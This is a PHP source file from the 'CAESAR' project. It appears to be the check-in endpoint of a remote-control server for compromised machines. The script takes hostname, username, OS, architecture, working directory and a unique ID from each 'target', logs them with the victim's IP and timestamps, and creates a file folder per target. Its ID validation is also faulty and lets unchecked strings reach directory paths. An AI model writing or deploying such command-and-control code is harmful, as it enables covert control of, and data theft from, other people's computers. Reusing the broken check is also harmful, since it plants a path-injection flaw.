<?php

	/*
		CAESAR

		Author : Michele '0blio' Cisternino
		Email  : miki.cisternino@gmail.com
		Github : https://github.com/0blio

		This project is released under the GPL 3 license.
	*/

	include '../database/connection.php';

	if ($_SERVER['REQUEST_METHOD'] == 'POST') {

		// If the request is valid
		if (isset($_POST['hostname'], $_POST['username'], $_POST['os'], $_POST['arch'], $_POST['unique_id'], $_POST['wd'])) {

			$hostname = urldecode($_POST['hostname']);
			$username = urldecode($_POST['username']);
			$os = urldecode($_POST['os']);
			$arch = $_POST['arch'];
			$unique_id = $_POST['unique_id'];
			$working_directory = urldecode($_POST['wd']);
			$ip = $_SERVER['REMOTE_ADDR'];
			$datetime = date("Y-m-d H:i:s");

			// If the user is not trying to alter the unique id (checking if the md5 string is valid)
			if (!preg_match('/[^A-Za-z0-9]/', $unique_id) || strlen($unique_id) != 32) {

				// Check if the target has already been acquired previously
				$target_exists = $db -> table ('targets') -> eq ('unique_id', $unique_id) -> exists();

				// If the target don't exists add it to the database
				if (!$target_exists) {
					// Resetting auto_increment
					$db -> execute ('ALTER TABLE targets AUTO_INCREMENT = 1;');

					// Inserting the new target info
					$db -> table ('targets')  -> insert (['unique_id' => $unique_id,
														  'hostname' => $hostname,
														  'username' => $username,
														  'os' => $os,
														  'arch' => $arch,
														  'ip' => $ip,
														  'first_request' => $datetime,
														  'last_request' => $datetime,
														  'working_directory' => $working_directory]);

					if (!file_exists('../files'))
						mkdir ('../files');

					mkdir ('../files/' . $unique_id);

			// Else if target exists update relevant data (ip, last time seen, working directory)
			} else {
				$db -> table ('targets') -> eq ('unique_id', $unique_id) -> update (['ip' => $ip, 'last_request' => $datetime, 'working_directory' => $working_directory]);
			}

			echo 'OK';
		}
	}
}
